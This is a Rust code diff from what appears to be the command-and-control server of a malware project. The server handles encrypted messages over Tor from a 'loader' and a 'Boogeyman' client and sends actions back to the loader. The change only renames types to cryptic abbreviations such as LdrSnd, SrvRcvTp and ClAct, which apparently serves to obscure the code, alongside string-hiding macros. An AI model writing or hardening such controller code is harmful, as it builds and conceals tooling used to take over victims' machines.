@@ -3,13 +3,13 @@ use std::net::SocketAddr;
 use chrono::Utc;
 use client_vars::types::receive::BoogeymanReceivePayload;
 use client_vars::types::send::BoogeymanSendPayload;
-use loader_vars::types::receive::LoaderReceivePayload;
-use loader_vars::types::send::LoaderSendPayload;
+use loader_vars::types::receive::LdrRcv;
+use loader_vars::types::send::LdrSnd;
 use serde::Deserialize;
 use serde::Serialize;
 use shared::constants::communication_encryption_key;
 use shared::network::tor::ServerReceive;
-use shared::network::tor::ServerReceiveType;
+use shared::network::tor::SrvRcvTp;
 use shared::utils::encryption::convert_key_to_bytes;
 use shared::utils::encryption::sauron_decrypt;
 use shared::utils::encryption::sauron_encrypt;
@@ -158,14 +158,14 @@ impl ServerHandler {
             .context(s!("Failed to parse decrypted_data as ServerReceive").to_string())?;
 
         match data.server_receive_type {
-            ServerReceiveType::Loader => {
-                let processed_data: LoaderSendPayload = serde_json
+            SrvRcvTp::Ldr => {
+                let processed_data: LdrSnd = serde_json
                     ::from_slice(&data.data)
                     .context(s!("Failed to parse binary data as LoaderSendPayload").to_string())?;
                 verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                 route_loader(self, processed_data, stream_ref).await
             }
-            ServerReceiveType::Boogeyman => {
+            SrvRcvTp::Bgm => {
                 let processed_data: BoogeymanSendPayload = serde_json
                     ::from_slice(&data.data)
                     .context(
@@ -179,10 +179,10 @@ impl ServerHandler {
 
     pub async fn send_action_to_loader(
         stream_ref: Arc<Mutex<TcpStream>>,
-        action: loader_vars::types::receive::ClientAction,
-        params: loader_vars::types::receive::ClientParams
+        action: loader_vars::types::receive::ClAct,
+        params: loader_vars::types::receive::ClPrms
     ) -> Result<()> {
-        let payload = LoaderReceivePayload { action, params };
+        let payload = LdrRcv { action, params };
         let binary_data = serde_json
             ::to_vec(&payload)
             .context(
